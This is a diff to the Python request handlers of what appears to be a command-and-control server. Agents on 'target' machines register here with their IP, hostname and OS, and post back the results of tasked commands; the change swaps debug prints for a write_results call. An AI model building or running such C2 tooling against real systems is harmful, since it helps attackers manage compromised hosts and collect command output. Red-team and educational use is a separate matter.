@@ -3,7 +3,7 @@
 from .agent import Agent
 import cgi
 from uuid import uuid4
-from .agents_helpers import add_agent
+from .agents_helpers import add_agent, write_results
 
 def register_agent(self):
     self.send_response(200)
@@ -42,18 +42,18 @@ def register_agent(self):
         # Grab the "task" field that was input by the post request.\
         uuid = uuid4()
         
-        print(f"uuid type is {type(uuid)}")
+        # print(f"uuid type is {type(uuid)}")
         # uuid = "uuid"
         ip_port = self.client_address
         (tgt_ip, tgt_port) = ip_port
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
         tgt_os_version = fields.get('os version')
-        print(f"Agent UUID:          {uuid}")
-        print(f"Target IP Address:   {tgt_ip}")
-        print(f"Target Hostname:     {tgt_hostname}")
-        print(f"Target OS:           {tgt_os}")
-        print(f"Target OS Version:   {tgt_os_version}\n")
+        # print(f"Agent UUID:          {uuid}")
+        # print(f"Target IP Address:   {tgt_ip}")
+        # print(f"Target Hostname:     {tgt_hostname}")
+        # print(f"Target OS:           {tgt_os}")
+        # print(f"Target OS Version:   {tgt_os_version}\n")
         new_agent = Agent(self.listener.name, str(uuid), tgt_ip, tgt_hostname[0], tgt_os[0], tgt_os_version[0])
         add_agent(new_agent)
 
@@ -76,7 +76,7 @@ def register_agent(self):
         self.end_headers()
 
 
-def collect_results(self):
+def collect_results(self, agent):
     self.send_response(200)
     self.send_header('content-type', 'text/html')
     # Always have to close the header.
@@ -115,9 +115,11 @@ def collect_results(self):
         task_id = fields.get('task id')
         task_cmd = fields.get('task cmd')
         task_results = fields.get('task results')
-        print(f"Task ID:             {task_id}")
-        print(f"Task Cmd:             {task_cmd}")
-        print(f"Task Results:        {task_results}")
+        # print(f"Task ID:             {task_id}")
+        # print(f"Task Cmd:             {task_cmd}")
+        # print(f"Task Results:        {task_results}")
+        write_results(task_id[0], task_cmd[0], task_results[0], agent)
+
         # Come back to this later to add to dict ******************************************
         # tasklist.append(new_task[0])
 
